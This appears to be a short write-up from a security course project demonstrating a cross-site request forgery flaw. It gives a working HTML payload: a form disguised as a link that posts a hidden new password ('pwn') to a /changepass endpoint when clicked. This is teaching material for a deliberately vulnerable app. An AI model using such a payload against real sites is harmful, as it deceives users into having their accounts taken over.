# F-secure Cyber Security Base - Project
====

# A8 - Cross-Site Request Forgery (CSRF)

Change victims password if they click following link:

```html
<style>.s{border:none;background-color:#fff;}.s:hover{text-decoration: underline;}</style><form action="/changepass" method="post"><input hidden type="text" name="newpass" value="pwn"/><input type="submit" class="s" value="http://my-site"/></form>
```
